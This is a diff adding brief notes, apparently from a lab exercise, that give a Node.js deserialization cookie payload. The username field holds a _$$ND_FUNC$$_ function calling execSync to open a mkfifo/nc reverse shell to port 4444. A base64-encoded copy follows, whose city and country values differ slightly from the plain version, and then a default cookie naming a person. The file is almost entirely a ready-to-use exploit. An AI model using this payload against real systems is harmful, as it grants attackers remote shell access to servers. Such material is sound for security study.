@@ -1,0 +1,13 @@
+Cookie with rm /tmp folder
+sequelized command:
+{"username":"_$$ND_FUNC$$_function(){\r\n      require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f\", function puts(error, stdout, stderr) {});\r\n    }()","country":"India","city":"Tirupati"}
+
+Base 64 encoded:
+eyJ1c2VybmFtZSI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpe1xyXG4gICAgICByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJykuZXhlY1N5bmMoXCJybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMjcuMC4wLjEgNDQ0NCA+L3RtcC9mXCIsIGZ1bmN0aW9uIHB1dHMoZXJyb3IsIHN0ZG91dCwgc3RkZXJyKSB7fSk7XHJcbiAgICB9KCkiLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiRGVsaGkifQ==
+
+
+Cookie for Yacha Venkata Rakesh
+
+The default cookie the site will send if there's no cookie associated 
+
+eyJ1c2VybmFtZSI6IllhY2hhIFZlbmthdGEgUmFrZXNoIiwiY291bnRyeSI6IklORElBIiwiY2l0eSI6IlRpcnVwYXRpIn0=
